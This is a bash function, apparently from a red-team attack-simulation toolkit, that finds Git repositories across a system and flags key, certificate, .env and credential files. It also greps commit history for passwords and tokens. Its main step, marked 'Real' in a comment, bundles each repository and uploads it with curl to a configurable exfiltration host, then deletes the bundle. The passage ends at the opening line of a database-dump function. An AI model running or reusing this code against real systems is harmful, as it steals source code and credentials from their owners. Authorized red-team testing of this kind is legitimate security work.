rt_744_git_repository_exfil() {
    rt_banner "RT-744" "Git Repository Data Exfiltration"
    
    # Find .git directories
    local GIT_REPOS
    GIT_REPOS=$(find / -name '.git' -type d 2>/dev/null | head -20)
    
    if [[ -z "$GIT_REPOS" ]]; then
        echo -e "    $YELLOW[-] No Git repositories found$NC"
        return
    fi
    
    echo -e "    $RED[+] Git repositories found: $(echo "$GIT_REPOS" | wc -l)$NC"
    
    echo "$GIT_REPOS" | while read -r gitdir; do
        local REPO_DIR
        REPO_DIR=$(dirname "$gitdir")
        echo -e "    $RED[+] Repository: $REPO_DIR$NC"
        
        # Check for sensitive files in repo
        local SENSITIVE
        SENSITIVE=$(find "$REPO_DIR" -maxdepth 2 \( -name '*.key' -o -name '*.pem' -o -name '.env' -o -name 'config.json' -o -name 'credentials' \) 2>/dev/null)
        if [[ -n "$SENSITIVE" ]]; then
            echo -e "        $RED[CRITICAL] Sensitive files:$NC"
            echo "$SENSITIVE" | head -5 | while read -r f; do echo -e "            $RED$f$NC"; done
        fi
        
        # Check git log for secrets
        if command -v git &>/dev/null; then
            local GIT_LOG
            GIT_LOG=$(cd "$REPO_DIR" && git log --all -p --grep='password\|secret\|key\|token' 2>/dev/null | grep -iE 'password|secret|api_key|token' | head -5)
            if [[ -n "$GIT_LOG" ]]; then
                echo -e "        $RED[CRITICAL] Secrets in git history!$NC"
                add_vuln "RT-744" "CRITICAL" "Git Secrets" "Secrets found in git history of $REPO_DIR" "exfil" "full" "MITRE T1552.001"
            fi
        fi
        
        # Real: pack and exfil the .git directory
        local REPO_NAME
        REPO_NAME=$(basename "$REPO_DIR")
        local PACK_FILE="/tmp/.${REPO_NAME}.git.bundle"
        if command -v git &>/dev/null; then
            (cd "$REPO_DIR" && git bundle create "$PACK_FILE" --all 2>/dev/null)
            if [[ -f "$PACK_FILE" ]]; then
                curl -sk -X POST "https://$EXFIL_HOST:$EXFIL_PORT/git" --data-binary "@$PACK_FILE" --connect-timeout 10 2>/dev/null && \
                    echo -e "        $RED[+] Git bundle exfiltrated: $PACK_FILE$NC"
                rm -f "$PACK_FILE" 2>/dev/null
            fi
        fi
        
        add_vuln "RT-744" "HIGH" "Git Repository Exfil" "Git repository at $REPO_DIR targeted for exfiltration" "exfil" "full" "MITRE T1213.003"
    done
}

rt_745_database_dump_exfiltration() {
